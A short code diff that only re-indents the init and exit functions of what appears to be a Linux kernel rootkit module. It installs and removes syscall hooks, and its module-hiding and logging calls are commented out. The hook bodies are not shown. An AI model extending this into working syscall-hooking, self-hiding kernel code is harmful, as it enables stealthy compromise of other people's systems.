@@ -9,24 +9,24 @@
 MODULE_LICENSE("GPL");
 
 static int rk_init(void) {
-    int err;
-    
-    err = fh_install_hooks(syscall_hooks, ARRAY_SIZE(syscall_hooks));
-    if (err){
-        return err;
-    }
+	int err;
+	
+	err = fh_install_hooks(syscall_hooks, ARRAY_SIZE(syscall_hooks));
+	if (err){
+		return err;
+	}
 
-    //hide_module();
+	//hide_module();
 
-    //rk_info("module loaded\n");
+	//rk_info("module loaded\n");
 
-    return 0;
+	return 0;
 }
 
 static void rk_exit(void) {
-    fh_remove_hooks(syscall_hooks, ARRAY_SIZE(syscall_hooks));
+	fh_remove_hooks(syscall_hooks, ARRAY_SIZE(syscall_hooks));
 
-    //rk_info("module unloaded\n");
+	//rk_info("module unloaded\n");
 }
 
 module_init(rk_init);
